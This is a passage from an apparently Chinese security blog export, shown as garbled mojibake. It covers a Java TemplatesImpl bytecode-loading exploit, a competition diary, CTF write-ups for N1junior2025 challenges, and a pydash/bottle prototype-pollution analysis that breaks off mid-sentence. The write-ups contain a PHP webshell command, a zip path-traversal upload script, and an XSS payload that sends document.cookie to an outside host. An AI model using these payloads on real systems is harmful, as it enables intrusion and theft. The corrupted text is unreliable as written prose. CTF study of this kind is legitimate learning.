æˆå‘½ä»¤æ‰§è¡Œ\næœ€åexp\npackage com.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.*; import java.util.*; import java.util.Properties; public class Hello { public static void main(String[] args) throws Exception{ String exp = \u0026#34;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAApIZWxsby5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAmAAoBABFjb20vZXhhbXBsZS9IZWxsbwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAADAAEACQAKAAEACwAAAGAAAgACAAAAFiq3AAG4AAISA7YABFenAAhMK7YABrEAAQAEAA0AEAAFAAIADAAAABoABgAAAAoABAAMAA0ADwAQAA0AEQAOABUAEAANAAAAEAAC/wAQAAEHAA4AAQcADwQAAQAQABEAAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABUAEgAAAAQAAQATAAEAEAAUAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAaABIAAAAEAAEAEwABABUAAAACABY=\u0026#34;; byte[] code = Base64.getDecoder().decode(exp); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(\u0026#34;_name\u0026#34;,\u0026#34;evil\u0026#34;,templates); setFieldValue(\u0026#34;_bytecodes\u0026#34;,new byte[][]{code},templates); setFieldValue(\u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl(), templates); templates.getOutputProperties(); } public static void setFieldValue(String name, Object value, Object obj) throws Exception{ Field f = obj.getClass().getDeclaredField(name); f.setAccessible(true); f.set(obj, value); } } ","date":"16 May 2025","externalUrl":null,"permalink":"/posts/classloader-learning/","section":"Posts","summary":"","title":"Classloader Learning","type":"posts"},{"content":"","date":"16 May 2025","externalUrl":null,"permalink":"/categories/java/","section":"Categories","summary":"","title":"JAVA","type":"categories"},{"content":"","date":"16 May 2025","externalUrl":null,"permalink":"/tags/loader/","section":"Tags","summary":"","title":"Loader","type":"tags"},{"content":"å‰è¨€ #\rå› ä¸ºè‚–è€å¸ˆå¸¦æˆ‘å‚åŠ äº†è¿™ä¸ªæ¯”èµ›ï¼Œéœ€è¦å°†rt-threadå†…æ ¸ç§»æ¤åˆ°OrangePi RV2ä¸Šï¼Œå¹¶ä¸”è¦åŠ å…¥ä¸€ä¸ªå†…æ ¸ç›‘æ§å®‰å…¨è¡Œä¸ºçš„ç³»ç»Ÿä»¥åŠåŠ å…¥ä¸€ä¸ªå›½å¯†ç³»ç»Ÿæœ€ååŠ å…¥ä¸€ä¸ªé‡åŒ–çš„llmæ¥è¿›è¡Œåˆ†æï¼Œäºæ˜¯ä¾¿æƒ³è®°å½•ä¸€ä¸‹è¿™ä¸ªå­¦ä¹ è¿‡ç¨‹ï¼Œå› ä¸ºäºŒè¿›åˆ¶ç¡®å®æ²¡æœ‰æ¥è§¦å¾ˆå¤šï¼Œè¿˜æœ‰125å¤©çš„æ—¶é—´ï¼Œå¸Œæœ›è‡ªå·±èƒ½å®Œæˆä»–å§\n4.15 #\ræ‹¿åˆ°æ¿å­ç¬¬ä¸€æ—¶é—´æŠŠubuntuçƒ§å½•è¿›å»äº†ï¼ˆç›®å‰å…ˆç”¨linuxåšæµ‹è¯•ï¼Œåç»­ç§»æ¤ä¸Šå»ï¼‰å¹¶ä¸”é…ç½®äº†sshå’Œvnc\n4.17 #\rä»Šå¤©åœ¨ç¡®å®šå¦‚ä½•å®ç°åŠŸèƒ½çš„æ€è·¯äº†\u0026hellip;å¥½å¤´ç–¼ æ™šä¸Šå¼€å§‹å­¦ä¹ linuxå†…æ ¸ä»¥åŠå…³äºé©±åŠ¨çš„ä¸€äº›çŸ¥è¯†ï¼Œè¿™ä¸¤å¤©ä¼šæ›´æ–°åˆ°blogä¸Šï¼Œä½†æ˜¯è¿˜éœ€è¦æ‘¸ç´¢ä¸€ä¸‹ï¼Œå› ä¸ºæœ‰ç‚¹å¤æ‚\n4.18-20 #\ræ­£åœ¨å­¦ä¹ linuxå†…æ ¸çš„çŸ¥è¯†ï¼Œå­¦ä¹ äº†å…³äºmodule.hå’Œprintk.håº“ï¼Œä»¥åŠç®€å•çš„å¯¼å…¥æ¨¡å—çš„å‘½ä»¤ï¼Œç„¶åå¯ä»¥å®ç°hello worldï¼ˆæ¢¦å¼€å§‹çš„åœ°æ–¹ï¼‰å‰©ä¸‹çš„è¿˜åœ¨å­¦å‘œå‘œå‘œ\n4.20-24 #\råœ¨ubuntuä¸Šå®ç°äº†ä¹‹åï¼Œå°è¯•åˆ°orangpiä¸Šè¿è¡Œï¼Œåˆšå¼€å§‹æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°å¯¹åº”å†…æ ¸å¤´æ–‡ä»¶åŒ…ï¼Œå› ä¸ºéœ€è¦ç¼–è¯‘ï¼Œä»–æ˜¯å•†å®¶è‡ªå·±æ”¹çš„å†…æ ¸ï¼Œä½†æ˜¯åœ¨ä»Šå¤©æ‰¾åˆ°äº†åœ¨/optç›®å½•ä¸‹ï¼Œæœ€åè·‘å‡ºæ¥äº† 4.24-5.4 #\rå…¶å®å¹¶æ²¡æœ‰å­¦ä»€ä¹ˆä¸œè¥¿ï¼Œå°±æ˜¯è¿˜åœ¨çœ‹è¿™æœ¬ä¹¦ï¼Œè¿›åº¦æœ‰ç‚¹æ…¢äº†æœ€è¿‘ï¼Œåœ¨å¿™åˆ«çš„äº‹æƒ…ï¼Œisccä¹Ÿå¼€å§‹äº†ï¼Œå¸Œæœ›èƒ½æ··ä¸ªå¥–å§\n","date":"15 May 2025","externalUrl":null,"permalink":"/posts/os/","section":"Posts","summary":"","title":"å…³äº2025å¹´å…¨å›½å¤§å­¦ç”Ÿè®¡ç®—æœºç³»ç»Ÿèƒ½åŠ›å¤§èµ›-æ“ä½œç³»ç»Ÿè®¾è®¡èµ›(å…¨å›½)","type":"posts"},{"content":"","date":"15 May 2025","externalUrl":null,"permalink":"/tags/include/","section":"Tags","summary":"","title":"Include","type":"tags"},{"content":"å‰è¨€ #\ræœ€è¿‘æ¯”è¾ƒå¿™ï¼Œn1juniorå½“æ—¶æŠ¥åäº†æ²¡å»æ‰“ï¼Œç°åœ¨æ¥å¤ç°ä¸€ä¸‹ï¼Œæ„Ÿè°¢baoå¸ˆå‚…æä¾›çš„é™„ä»¶\nGavatar #\rupload.php:\n\u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); æœ€åå¯ä»¥åªä¼ urlï¼Œç›´æ¥postä¼  ç„¶åavatar.php å¯ä»¥æ­£å¸¸è¯»åˆ° ä½†æ˜¯dockerfileå¯ä»¥çœ‹è§flagè¦rceæ‰å¯ä»¥è¯»åˆ° æ— è„‘ä¸Šcn-extï¼Œç”¨çš„ç‚å­—è¾ˆå¸ˆå‚…çš„è„šæœ¬ï¼š https://github.com/kezibei/php-filter-iconv/blob/main/README.md cmd = \u0026ldquo;echo \u0026lsquo;\u0026lt;?=@eval($_POST[1]);?\u0026gt;\u0026rsquo; \u0026gt; shell.php\u0026rdquo; traefik #\rä¸»è¦è€ƒäº†ä¸€ä¸ªtraefikçš„åŠ¨æ€ä»£ç†è½¬å‘è¿˜æœ‰æœ¬åœ°xffä¼ªé€ ã€‚ æˆ‘ä»¬é€šè¿‡æŸ¥çœ‹docå¯ä»¥çœ‹åˆ°traefikçš„åŠ¨æ€é…ç½®æ˜¯å¯ä»¥å®æ—¶æ›´æ–°çš„ã€‚ æ‰€ä»¥æ€è·¯å°±æ˜¯ï¼Œä¸Šä¼ ä¸€ä¸ªconfigæ–‡ä»¶å°†dynamicé…ç½®ç»™ä»–è¦†ç›–æ‰å°†flagè·¯ç”±æš´éœ²å‡ºæ¥ã€‚ é¦–å…ˆçœ‹ä¸€ä¸‹åŸæœ¬çš„é…ç½®æ€ä¹ˆå†™çš„\n# Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy æ‰€ä»¥æˆ‘ä»¬éœ€è¦åŠ ä¸€ä¸ªè·¯ç”±\nflag: rule: Path(\u0026#39;/flag\u0026#39;) entrypoints: [web] service: proxy æ³¨æ„ä¸€ä¸‹è¦å†™ä¸€ä¸ªmiddlewaresåŠ ä¸€ä¸ªhearderå°±è¡Œäº† ç„¶åçœ‹åˆ°æºç :\nä¸Šä¼ åå°±è§£å‹ æ²¡æœ‰æ ¡éªŒï¼Œæ‰€ä»¥å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œæ‰€ä»¥ç°åœ¨çš„æ€è·¯å°±å¾ˆæ¸…æ™°ï¼Œä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ç›®å½•ç©¿è¶Šåˆ°configæ–‡ä»¶ï¼Œè¦†ç›–ç„¶åå°†flagè·¯ç”±æš´éœ²å‡ºæ¥æœ€åä¼ªé€ å³å¯\nfrom zipfile import ZipFile import zipfile import requests binary=open(\u0026#34;dynamic.yml\u0026#34;,\u0026#34;r\u0026#34;).read() with zipfile.ZipFile(\u0026#34;test.zip\u0026#34;, \u0026#34;w\u0026#34;, zipfile.ZIP_DEFLATED) as zipf: zipf.writestr(\u0026#34;./../../.config/dynamic.yml\u0026#34;, binary) print(f\u0026#34;[+] ZIP æ–‡ä»¶ç”Ÿæˆå®Œæˆ\u0026#34;) def upload(): files = {\u0026#34;file\u0026#34;: (\u0026#34;test.zip\u0026#34;, open(\u0026#34;test.zip\u0026#34;, \u0026#34;rb\u0026#34;), \u0026#34;application/zip\u0026#34;)} res = requests.post(url = \u0026#34;http://192.168.174.128/public/upload\u0026#34; ,files = files) if res.status_code == 200: print(\u0026#34;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: upload() res = requests.get(url = \u0026#34;http://192.168.174.128/flag\u0026#34;) print(res.text) display #\rå¾ˆæ˜æ˜¾çš„ä¸€é“xssé¢˜ï¼Œå¤§å®¶è¯´æŒºå¥½ç©çš„æˆ‘å°±æ¥ç©ç©äº† è¿™é‡Œç”¨äº†DOMpurifyæ¥å¯¹æ ‡ç­¾è¿›è¡Œè¿‡æ»¤ï¼Œ hints: ç”¨iframeåµŒå…¥å­é¡µé¢å¯ä»¥é‡æ–°å”¤èµ·DOMè§£æå™¨è§£æscriptæ ‡ç­¾\nå…ˆçœ‹ä¸€ä¸‹indexè·¯ç”±\nif (queryText) { const sanitizedText = sanitizeContent(atob(decodeURI(queryText))); if (sanitizedText.length \u0026gt; 0) { textInput.innerHTML = sanitizedText; // å†™å…¥é¢„è§ˆåŒº contentDisplay.innerHTML = textInput.innerText; // å†™å…¥æ•ˆæœæ˜¾ç¤ºåŒº insertButton.disabled = false; } else { textInput.innerText = \u0026#34;Only allow h1, h2 tags and plain text\u0026#34;; } } ç”¨çš„æ˜¯textInputæ–‡æœ¬ä½œä¸ºè¾“å…¥ï¼Œç„¶åbase64ç¼–ç ä¸€ä¸‹ï¼Œæµ‹è¯•ï¼š cspç­–ç•¥:\nconst csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; index.jsä¸­è®¾ç½®äº†dompurifyï¼Œé™åˆ¶äº†åªèƒ½ç”¨h1å’Œh2æ ‡ç­¾ å¤„ç†å¼‚å¸¸è·¯ç”±ï¼Œä¹Ÿå°±æ˜¯404é¡µé¢\napp.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 é¡µé¢ æ‰€ä»¥å…¶å®å°±æ˜¯æ‰“404é¡µé¢ç„¶åè®©å…¶è§£æä¸ºhtmlå³å¯ã€‚ æ–‡ç« ï¼š https://www.justus.pw/writeups/sekai-ctf/tagless.html ç„¶åæ ‡ç­¾å°±ç”¨å®ä½“åŒ–ç¼–ç ç»•è¿‡å°±è¡Œï¼Œå› ä¸ºæ˜¯text æœ€åå°±æ˜¯iframe+srcdoc\næœ€åplayloadï¼š \u0026amp;#60;iframe srcdoc=\u0026quot;\u0026amp;#60;script src='**/fetch(http://ip/+document.cookie);//'\u0026amp;#62;\u0026amp;#60;/script\u0026amp;#62;\u0026quot;\u0026amp;#62; å½“ç„¶è¿™é‡Œçš„å®ä½“åŒ–ç¼–ç ä¹Ÿå¯ä»¥ç”¨åˆ«çš„æ–¹å¼æ¥å†™ï¼Œç„¶åé—­åˆå‰é¢çš„/ä¹Ÿå¯ä»¥åˆ©ç”¨æ¢è¡Œæ¥ç»•ã€‚ ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘è¿™é‡Œæ‰“botæ‰“ä¸é€šï¼Œä½†æ˜¯indexå¯ä»¥æ‰“çš„é€šï¼Œå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜ bushiï¼Œåˆšå†™å®Œè¿™ä¸€æ®µå°±èƒ½æ‰“é€š EasyDB #\ræ¥åˆ°æˆ‘æœ€ä¸æ“…é•¿çš„javaäº†ï¼Œä½†æ˜¯æ€»å¾—é¢å¯¹å§ï¼Œä¸€æ­¥æ­¥æ¥å§\nDOCKER_BUILDKIT=1 docker-compose up -d å…ˆèµ·ä¸€ä¸ªç¯å¢ƒï¼Œå»åƒä¸ªé¥­ï¼Œæ™šç‚¹æ¥ç»§ç»­æ\nå¾ˆç®€å•åˆ¤æ–­æ˜¯H2æ•°æ®åº“\nloginè·¯ç”± è·Ÿè¿›çœ‹åˆ°æœ‰ä¸ªqueryçš„åœ°æ–¹ executeQueryè¿™é‡Œå¯ä»¥å †å è¾“å…¥ é»‘åå•ï¼š ç„¶åä¸ä¼šäº†ï¼Œé©¬ä¸Šå»è¡¥çŸ¥è¯†\u0026hellip;\u0026hellip;.. å¯ä»¥çœ‹åˆ°h2çš„é…ç½®æ–‡ä»¶ ç„¶åç½‘ä¸Šçœ‹äº†å¤§æ¦‚æœ‰å‡ ç§æ‰“æ³•ï¼Œè¿˜åœ¨å­¦ä¹ ä¸­å‘œå‘œå‘œï¼Œä½†æ˜¯è¿™é‡Œæ˜¯åˆ©ç”¨alieså¯ä»¥å†™ä¸€ä¸ªæ–¹æ³•æ¥è°ƒç”¨å»å¼¹shellæˆ–è€…å…¶ä»–æ“ä½œï¼Œå¤ªæ™šäº†ï¼Œè¯¥ä¼‘æ¯äº†\u0026hellip;\u0026hellip;\u0026hellip;\u0026hellip;.\n","date":"15 May 2025","externalUrl":null,"permalink":"/posts/n1junior2025/","section":"Posts","summary":"","title":"N1junior2025","type":"posts"},{"content":"","date":"15 May 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"WEB","type":"tags"},{"content":"é¦–å‘äºå¥‡å®‰ä¿¡æ”»é˜²è®ºå›ï¼šhttps://forum.butian.net/share/4251\nå‰è¨€ #\rNCTFé‡åˆ°äº†ä¸€é“pydashé¢˜ç›®ï¼Œä¼¼ä¹ä¸SUCTF2025å‡ºçš„ä¸€é“SU_blogéƒ½æ˜¯è¿™ä¸ªçŸ¥è¯†ç‚¹ï¼Œé‚æƒ³åŸºäºè¿™é“é¢˜åˆ†æä¸€ä¸‹é“¾å­ã€‚å…¶å®è¿˜å¯ä»¥ç»“åˆidekctfé‚£é“é¢˜\nNCTF-Pydash #\ræˆ‘ä»¬é¦–å…ˆæ¥è´´ä¸€ä¸‹é¢˜ç›®ç»™çš„æºç ç„¶åä¸‹è½½ä¸€ä¸‹Pydashçš„æºç \n\u0026#39;\u0026#39;\u0026#39; Hints: Flagåœ¨ç¯å¢ƒå˜é‡ä¸­ \u0026#39;\u0026#39;\u0026#39; from typing import Optional import pydash import bottle __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;,\u0026#34;render\u0026#34; ] __forbidden_name__=[ \u0026#34;bottle\u0026#34; ] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False for word in __forbidden_name__: if name==word: return False for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False obj=globals()[name] try: pydash.set_(obj,path,value) except: return False return True @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): name = bottle.request.query.get(\u0026#39;name\u0026#39;) path=bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path,str): return \u0026#34;no\u0026#34; if len(name)\u0026gt;6 or len(path)\u0026gt;32: return \u0026#34;no\u0026#34; value=bottle.request.json.get(\u0026#39;value\u0026#39;) return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): path=bottle.request.query.get(\u0026#39;path\u0026#39;) if len(path)\u0026gt;10: return \u0026#34;hacker\u0026#34; blacklist=[\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;_\u0026#34;] for c in path: if c in blacklist: return \u0026#34;hacker\u0026#34; return bottle.template(path) bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) ä¸»è¦çœ‹ä¸€ä¸‹è¿™é‡Œçš„set_\npydash.set_(obj,path,value) æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹pydashå…³äºè¿™ä¸€ä¸ªå‡½æ•°æ˜¯å¦‚ä½•ç”¨çš„ /src/pydash/objects.py\ndef set_(obj: T, path: PathT, value: t.Any) -\u0026gt; T: \u0026#34;\u0026#34;\u0026#34; Sets the value of an object described by `path`. If any part of the object path doesn\u0026#39;t exist, it will be created. Args: obj: Object to modify. path: Target path to set value to. value: Value to set. Returns: Modified `obj`. Warning: `obj` is modified in place. Example: \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.b.c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;b\u0026#39;: {\u0026#39;c\u0026#39;: 1}}} \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.0.c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;0\u0026#39;: {\u0026#39;c\u0026#39;: 1}}} \u0026gt;\u0026gt;\u0026gt; set_([1, 2], \u0026#34;[2][0]\u0026#34;, 1) [1, 2, [1]] \u0026gt;\u0026gt;\u0026gt; set_({}, \u0026#34;a.b[0].c\u0026#34;, 1) {\u0026#39;a\u0026#39;: {\u0026#39;b\u0026#39;: [{\u0026#39;c\u0026#39;: 1}]}} .. versionadded:: 2.2.0 .. versionchanged:: 3.3.0 Added :func:`set_` as main definition and :func:`deep_set` as alias. .. versionchanged:: 4.0.0 - Modify `obj` in place. - Support creating default path values as ``list`` or ``dict`` based on whether key or index substrings are used. - Remove alias ``deep_set``. \u0026#34;\u0026#34;\u0026#34; return set_with(obj, path, value) ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¾€nameä¸­ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œpathä¸­ä¼ å…¥å…¶å±æ€§åï¼Œvaluesä¼ å…¥æ›´æ”¹çš„å€¼å°±å¯ä»¥æ”¹æ‰å…¶å±æ€§çš„å€¼ï¼Œä¾‹å¦‚è¿™æ ·å­\nimport pydash class Apple: def __init__(self): self.name = \u0026#34;apple\u0026#34; self.sweet = 10 a = Apple() print(f\u0026#34;ä¿®æ”¹å‰: {a.sweet}\u0026#34;) pydash.set_(a, \u0026#34;sweet\u0026#34;, 100) print(f\u0026#34;ä¿®æ”¹å: {a.sweet}\u0026#34;) æ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªæ¥è¿›è¡Œæ±¡æŸ“æŸäº›å‚æ•°ä»è€Œè¯»å–åˆ°environã€‚ æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¦æ±¡æŸ“ä»€ä¹ˆå€¼ï¼Œé¦–å…ˆä»è¿™ä¸ªæºç çœ‹ä¸åˆ°å¯ä»¥è¯»å–environçš„åœ°æ–¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥å»æ‰¾ä¸€ä¸‹importçš„åº“ï¼Œå¯ä»¥çœ‹åˆ°æœ€åé¢return bottle.template(path)returnäº†ä¸€ä¸ªå€¼ï¼Œåˆ©ç”¨bottleæ¥æ¸²æŸ“æ¨¡æ¿ï¼Œé‚çœ‹å…¶æºç ã€‚ æˆ‘ä»¬ç›´æ¥æœç´¢åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œçœ‹åˆ°è¿™ä¸€è¡Œ\nadapter = kwargs.pop(\u0026#39;template_adapter\u0026#39;, SimpleTemplate) lookup = kwargs.pop(\u0026#39;template_lookup\u0026#39;, TEMPLATE_PATH) å¯ä»¥çœ‹åˆ°é»˜è®¤çš„æ¨¡æ¿å¼•æ“æ˜¯SimpleTemplateï¼Œlookupå°±æ˜¯æ¨¡æ¿çš„æœç´¢è·¯å¾„ä¹Ÿå°±æ˜¯TEMPLATE_PATHè¿™ä¸ªå˜é‡ é»˜è®¤çš„TEMPLATE_PATHçš„å€¼ä¸º['./','./views/']ï¼Œæ‰€ä»¥ä¼šå»è¿™é‡Œé¢å»lookup ç„¶åæ¥ç€äº¤ç»™SimpleTemplateå»è§£æ\nTEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings) else: TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings) è·Ÿè¿›è¿™ä¸ªè§£æå™¨ï¼Œç„¶åå› ä¸ºåé¢ä¼ å…¥çš„æ˜¯nameæ˜¯ä¸€ä¸ªpathè€Œä¸æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œæ‰€ä»¥ä¼šèµ°åˆ°BaseTemplateè¿™é‡Œå…ˆå¯»æ‰¾å¹¶è§£æç›®å½•ä¸‹çš„æ¨¡æ¿æ–‡ä»¶å†æ‰”ç»™SimpleTemplateè¿›è¡Œæ¸²æŸ“è§£æã€‚ è¿™é‡Œçš„nameå°±æ˜¯ä¼ å…¥çš„bottle.template(path)çš„å€¼ï¼Œè¿™é‡Œå‡è®¾æˆ‘ä»¬pathä¼ çš„æ˜¯environï¼Œç„¶åé€šè¿‡abspath()æ–¹æ³•å¾—åˆ°TEMPLATE_PATHçš„ç»å¯¹è·¯å¾„ã€‚æ¥ç€è¿›å…¥searchæ–¹æ³•ï¼ˆname=environï¼‰ searchæ–¹æ³•ä¸­ æœ€åæŠŠnameæ‹¼æ¥åˆ°lookupä¸­çš„æ¯ä¸ªç»å¯¹è·¯å¾„ä¸­ï¼Œç„¶åè¯»åˆ°æ–‡ä»¶åå°±è¿”å›è¿™ä¸ªfnameï¼Œæ¥ç€èµ°åˆ°SimpleTemplateçš„prepareæ–¹æ³•\nclass SimpleTemplate(BaseTemplate): def prepare(self, escape_func=html_escape, noescape=False, syntax=None, **ka): self.cache = {} enc = self.encoding self._str = lambda x: touni(x, enc) self._escape = lambda x: escape_func(touni(x, enc)) self.syntax = syntax if noescape: self._str, self._escape = self._escape, self._str è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯åˆå§‹åŒ–æ¨¡æ¿çš„å­—ç¬¦å¤„ç†é€»è¾‘ï¼Œæ”¯æŒ HTML è½¬ä¹‰æˆ–ç›´æ¥è¾“å‡ºåŸå§‹ HTMLï¼Œä¹Ÿå°±æ˜¯è§£æè¿™ä¸ªä¼ å…¥çš„templateå˜æˆhtml ç„¶åå›åˆ°templateç»“å°¾\nTEMPLATES[tplid].render(kwargs) è¿›å…¥renderæ–¹æ³• èµ°åˆ°executeæ–¹æ³• æ„å»ºäº†envæ‰§è¡Œç¯å¢ƒï¼Œç„¶ååœ¨envä¸­æ‰§è¡Œé¢„ç¼–è¯‘çš„æ¨¡æ¿ä¹Ÿå°±æ˜¯è¿™é‡Œçš„self.c å¦‚æœæ¨¡æ¿è°ƒç”¨ rebase() ç»§æ‰¿çˆ¶æ¨¡æ¿å°±é€’å½’æ¸²æŸ“çˆ¶æ¨¡ç‰ˆ è¿™ä¸ªæ—¶å€™å°±ä¼šå»è¯»å–environæ¨¡æ¿æ–‡ä»¶ ç„¶ååœ¨renderä¸­è¿”å›è§£æåçš„å†…å®¹ è‡³æ­¤æ•´ä¸ªé“¾å­å°±åˆ†æå®Œäº†ï¼Œæœ€åæ•´ç†ä¸€ä¸‹é“¾å­é€»è¾‘\ntemplate:adapter()-\u0026gt;class:BaseTemplate:search()-\u0026gt;class:SimpleTemplate:prepare()-\u0026gt;render()-\u0026gt;exec()-\u0026gt;stdout æ‰€ä»¥å¾ˆç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æ¨¡æ¿æ–‡ä»¶æ”¹æˆlinuxçš„procè®©ä»–å»è¯»environå³å¯ï¼Œåˆ©ç”¨set_æ–¹æ³•æ›´æ”¹æ‰TEMPLATE_ 